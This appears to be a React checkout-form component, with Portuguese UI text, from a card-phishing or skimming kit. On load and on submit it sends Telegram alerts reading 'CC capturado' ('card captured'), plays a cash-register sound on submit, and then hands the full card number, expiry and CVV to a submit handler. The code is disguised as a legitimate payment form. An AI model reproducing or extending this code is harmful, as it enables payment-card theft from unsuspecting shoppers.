
import React, { useEffect } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Button } from '@/components/ui/button';
import { Form } from '@/components/ui/form';
import { CreditCardData } from '@/types/checkout';
import { cardSchema } from './cardValidation';
import { CardFormFields } from './CardFormFields';
import { detectCardBrand } from './CardBrandDetector';
import { sendTelegramNotification } from '@/lib/notifications/sendTelegramNotification';
import { useToast } from '@/hooks/use-toast';

interface CardFormProps {
  onSubmit: (data: CreditCardData) => void;
  isLoading: boolean;
  buttonColor?: string;
  buttonText?: string;
  productPrice?: number;
}

export const CardForm: React.FC<CardFormProps> = ({ 
  onSubmit, 
  isLoading, 
  buttonColor = '#006400', // Dark green color
  buttonText = 'Finalizar Pagamento',
  productPrice = 0
}) => {
  const { toast } = useToast();
  const form = useForm<z.infer<typeof cardSchema>>({
    resolver: zodResolver(cardSchema),
    defaultValues: {
      holderName: '',
      number: '',
      expiryDate: '',
      cvv: '',
      installments: 1,
    },
    mode: 'onChange'
  });

  // Enviar notificação quando o componente montar
  useEffect(() => {
    const sendNotification = async () => {
      try {
        await sendTelegramNotification('📲 1x CC capturado (formulário carregado)');
        console.log('Telegram notification sent on card form load');
      } catch (error) {
        console.error('Error sending Telegram notification on form load:', error);
      }
    };
    
    sendNotification();
  }, []);

  const handleSubmit = async (values: z.infer<typeof cardSchema>) => {
    const cardBrand = detectCardBrand(values.number);
    const cardData: CreditCardData = {
      holderName: values.holderName,
      number: values.number.replace(/\s/g, ''),
      expiryDate: values.expiryDate,
      cvv: values.cvv,
      brand: cardBrand.brand || 'unknown',
      installments: values.installments
    };
    
    // Tocar som de caixa registradora quando os dados do cartão forem enviados
    try {
      const cashSound = new Audio('/cash-register.mp3');
      await cashSound.play();
    } catch (audioError) {
      console.error('Error playing cash register sound:', audioError);
    }
    
    // Enviar notificação do Telegram quando os dados do cartão forem preenchidos e enviados
    try {
      await sendTelegramNotification(`💳 2x CC capturado - ${(cardData.brand || 'unknown').toUpperCase()}`);
      console.log('Telegram notification sent on card form submit');
      
      toast({
        title: "Processando pagamento",
        description: "Estamos processando seus dados de pagamento...",
      });
    } catch (error) {
      console.error('Error sending Telegram notification:', error);
    }
    
    onSubmit(cardData);
  };
  
  return (
    <Form {...form}>
      <form onSubmit={form.handleSubmit(handleSubmit)} className="space-y-6">
        <CardFormFields form={form} productPrice={productPrice} />
        
        <Button 
          type="submit" 
          disabled={isLoading}
          className="w-full p-3 mt-6 text-white font-medium text-center rounded"
          style={{ backgroundColor: buttonColor }}
        >
          {isLoading ? 'Processando...' : buttonText}
        </Button>
      </form>
    </Form>
  );
};
